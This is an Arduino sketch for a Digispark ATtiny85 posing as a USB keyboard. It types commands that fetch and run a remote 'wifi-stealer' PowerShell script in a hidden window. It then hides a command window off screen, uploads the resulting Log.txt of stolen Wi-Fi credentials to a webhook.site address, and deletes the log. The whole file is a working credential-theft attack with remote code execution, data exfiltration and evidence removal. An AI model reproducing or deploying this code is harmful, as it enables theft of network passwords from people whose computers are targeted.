// Import CustomDigiKeyboard library
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

// Change to your script url
#define scriptUrl "https://raw.githubusercontent.com/Rival420/ATtiny85-test/main/wifi-stealer"

void setup() {
  // Initialize the digital pin as an output
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
 DigiKeyboard.update();
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(3000);

  // Type Windows + R (Run a command)
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Wait
 DigiKeyboard.delay(100);
  // Execute script in hidden powershell
 DigiKeyboard.print("powershell -windowstyle hidden IEX(wget " scriptUrl " | select content)\n");
 DigiKeyboard.delay(5000);

 //opening cmd
 DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
    DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %userprofile%/Desktop ");
  DigiKeyboard.delay(500);

 //sending the logfile to webhook
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/33bdc51d-923f-444f-a075-62ab2b30d211 -Method POST -ContentType text/plain -InFile Log.txt");
  DigiKeyboard.delay(1000);

  //Deleting the log file
  DigiKeyboard.println("del Log.txt /s /f /q");
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");

  //turn on led when program finishes
 digitalWrite(1, HIGH); 
 DigiKeyboard.delay(90000);
 digitalWrite(1, LOW); 
 DigiKeyboard.delay(5000);
}
